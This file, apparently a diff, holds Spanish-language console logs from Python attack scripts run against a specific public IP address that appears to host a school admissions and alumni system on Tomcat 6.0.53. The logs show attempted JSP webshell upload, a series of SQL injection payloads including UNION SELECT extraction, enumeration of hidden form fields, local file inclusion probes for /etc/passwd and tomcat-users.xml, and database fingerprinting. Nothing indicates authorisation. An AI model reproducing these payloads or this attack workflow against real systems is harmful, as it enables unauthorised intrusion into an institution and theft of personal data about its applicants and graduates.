@@ -1,0 +1,168 @@
+Script de SQL Injection con URL Correcta:
+
+=== EXPLOTACIÓN COMPLETA TOMCAT 6.0.53 ===
+
+[*] Ejecutando exploits específicos para Tomcat 6.0.53...
+
+[*] Explotando RequestParamExample...
+
+[*] Explotando SessionExample...
+[-] Error en SessionExample: There are multiple cookies with name, 'JSESSIONID'
+
+[*] Probando credenciales específicas de Tomcat 6...
+[-] No se encontraron credenciales válidas
+
+[*] Intentando upload de webshell JSP...
+[+] Directorio accesible: https://189.254.143.102/examples/servlets/
+PS C:\Users\MarxB\desktop\ProyectoSito> py .\IURL.py
+
+[*] SQL Injection avanzado...
+[*] Descubriendo URL correcta del login...
+[-] No se encontró URL de login específica, usando página principal
+[*] Usando URL: https://189.254.143.102
+[*] Probando payload 1: admin' OR '1'='1'--
+    Status: 200, Tamaño: 15957
+    [+] Respuesta guardada en response_admin' OR .html
+[*] Probando payload 2: ' OR '1'='1'--
+    Status: 200, Tamaño: 15952
+    [+] Respuesta guardada en response_' OR '1'='.html
+[*] Probando payload 3: admin' OR 1=1--
+    Status: 200, Tamaño: 15953
+    [+] Respuesta guardada en response_admin' OR .html
+[*] Probando payload 4: ' OR 1=1--
+    Status: 200, Tamaño: 15948
+    [+] Respuesta guardada en response_' OR 1=1--.html
+[*] Probando payload 5: admin' UNION SELECT 1,2--
+    Status: 200, Tamaño: 15963
+    [+] Respuesta guardada en response_admin' UNI.html
+[*] Probando payload 6: ' UNION SELECT 1,2,3--
+    Status: 200, Tamaño: 15960
+    [+] Respuesta guardada en response_' UNION SE.html
+[*] Probando payload 7: admin'/*
+    Status: 200, Tamaño: 15946
+[-] Error con payload 7: [Errno 2] No such file or directory: "response_admin'/*.html"
+[*] Probando payload 8: admin' AND 1=CAST((SELECT version()) AS INT)--
+    Status: 200, Tamaño: 15984
+    [+] Respuesta guardada en response_admin' AND.html
+
+[*] Explotando páginas JSP accesibles...
+
+[*] Analizando: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N
+    [+] Formularios encontrados: 1
+    Hidden: yAccion =
+    Hidden: yInteresado = 0
+    Hidden: yEncuestado = 0
+    Hidden: yCveTipoSeguroOtro = 10
+    Hidden: yResolucion = 800x600
+    Hidden: ySexo = M
+    Hidden: yObjeto =
+    Hidden: yScroll =
+    Hidden: yBloqueoG = true
+    Hidden: yMenorEdad = 1
+
+[*] Analizando: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D
+    [+] Formularios encontrados: 1
+    Hidden: yAccion =
+    Hidden: yInteresado = 0
+    Hidden: yEncuestado = 0
+    Hidden: yCveTipoSeguroOtro = 10
+    Hidden: yResolucion = 800x600
+    Hidden: ySexo = M
+    Hidden: yObjeto =
+    Hidden: yScroll =
+    Hidden: yBloqueoG = false
+    Hidden: yMenorEdad = 1
+    Hidden: xNumeroInterior =
+    Hidden: yColonia = -1
+    Hidden: yCiudad = 0
+    Hidden: yEstado = 0
+    Hidden: yBachillerato = -1
+    Hidden: yCveEspecialidadBachillerato = -1
+    Hidden: xNumIntP = -
+    Hidden: yColoniaP = -1
+    Hidden: yCiudad2 = 0
+    Hidden: yEstado2 = 0
+
+[*] Analizando: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=Z
+    [+] Formularios encontrados: 1
+    Hidden: yAccion =
+    Hidden: yInteresado = 0
+    Hidden: yEncuestado = 0
+    Hidden: yCveTipoSeguroOtro = 10
+    Hidden: yResolucion = 800x600
+    Hidden: ySexo = M
+    Hidden: yObjeto =
+    Hidden: yScroll =
+    Hidden: yBloqueoG = true
+    Hidden: yMenorEdad = 1
+
+[*] Analizando: /jsp/escolar/proceso_admision_lic/proceso_interesado.jsp
+    [+] Formularios encontrados: 1
+    Hidden: yAccion =
+    Hidden: yInteresado = 0
+    Hidden: yEncuestado = 0
+    Hidden: yAlumnoTSU = true
+    Hidden: yResolucion = 800x600
+    Hidden: ySexo = M
+    Hidden: yUbicar =
+    Hidden: yObjeto =
+    Hidden: yScroll =
+    Hidden: yBloqueoG = true
+    Hidden: yMenorEdad = 1
+
+[*] Analizando: /jsp/seguimiento_egreso/proceso_registro_egresado.jsp?xNuevo=1
+    [+] Formularios encontrados: 1
+    Hidden: yAccion =
+    Hidden: yResolucion =
+    Hidden: yMostrar = false
+    Hidden: ySave = false
+    Hidden: yCarrera = 0
+    Hidden: yEspecialidad = -1
+    Hidden: yColonia = -1
+    Hidden: yCiudad = -1
+    Hidden: yEstado = -1
+    Enlaces JSP: ['aviso.jsp']
+
+[*] Analizando: /jsp/index.jsp
+    [+] Formularios encontrados: 1
+    Enlaces JSP: ['cerrar_sesion.jsp']
+
+[*] Probando Local File Inclusion...
+[+] Respuesta 200: ../../../../../../etc/passwd
+[+] Respuesta 200: ../../../../../../windows/win.ini
+[+] Respuesta 200: ../../../../../../conf/tomcat-users.xml
+[+] Respuesta 200: file:///etc/passwd
+[+] Respuesta 200: http://localhost:8080/manager/html
+
+Script de Explotación de JSP Index:
+
+PS C:\Users\MarxB\desktop\ProyectoSito> py .\EIndex.py
+[*] Analizando /jsp/index.jsp...
+[+] Status: 200
+[+] Tamaño: 1750 bytes
+[+] Página guardada en index_jsp_analysis.html
+[+] /jsp/index.jsp es diferente de la página principal
+
+[*] Buscando páginas de administración...
+
+[*] Fuerza bruta de directorios JSP...
+PS C:\Users\MarxB\desktop\ProyectoSito>
+
+Script de Conexión a Base de Datos via SQL Injection:
+
+PS C:\Users\MarxB\desktop\ProyectoSito> py .\CBD.py
+[*] Identificando tipo de base de datos...
+[!] Posible MySQL detectado
+[*] Base de datos identificada: MySQL
+
+[*] Intentando extraer datos...
+[*] Probando: admin' UNION SELECT table_name,2,3 FROM informatio...
+[!] Respuesta interesante obtenida
+[*] Probando: admin' UNION SELECT name,2,3 FROM sysobjects WHERE...
+[!] Respuesta interesante obtenida
+[*] Probando: admin' UNION SELECT user,2,3 FROM dual--...
+[!] Respuesta interesante obtenida
+[*] Probando: admin' UNION SELECT current_user,2,3--...
+[!] Respuesta interesante obtenida
+[*] Probando: admin' UNION SELECT @@version,2,3--...
+[!] Respuesta interesante obtenida
